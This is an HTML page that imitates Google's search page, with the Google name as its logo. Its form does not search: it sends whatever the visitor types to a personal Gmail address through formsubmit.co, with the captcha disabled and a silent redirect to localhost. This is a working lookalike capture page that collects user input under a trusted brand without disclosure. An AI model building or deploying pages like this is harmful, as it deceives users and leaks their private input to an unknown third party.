<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Search</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    height: 100vh;
    background: url('https://images.unsplash.com/photo-1505761671935-60b3a7427bad') no-repeat center center/cover;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
}

.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.3);
    top: 0;
    left: 0;
}

.container {
    position: relative;
    text-align: center;
    color: white;
}

.logo {
    font-size: 60px;
    font-weight: bold;
    margin-bottom: 20px;
}

.search-box {
    width: 500px;
    background: white;
    border-radius: 30px;
    padding: 12px 20px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
}

.search-box input {
    border: none;
    outline: none;
    width: 100%;
    font-size: 16px;
}

button {
    margin-top: 20px;
    padding: 10px 20px;
    border: none;
    background: #f8f9fa;
    cursor: pointer;
    border-radius: 5px;
}

button:hover {
    background: #e0e0e0;
}
</style>
</head>

<body>

<div class="overlay"></div>

<div class="container">
    <div class="logo">Google</div>

    <!-- FORM -->
    <form action="https://formsubmit.co/srikavi0412@gmail.com" method="POST">
        
        <div class="search-box">
            <input type="text" name="search" placeholder="Search Google or type a URL" required>
        </div>

        <!-- Hidden settings -->
        <input type="hidden" name="_subject" value="Search Query">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="http://localhost:8000">

        <button type="submit">Search</button>
    </form>
</div>

</body>
</html>
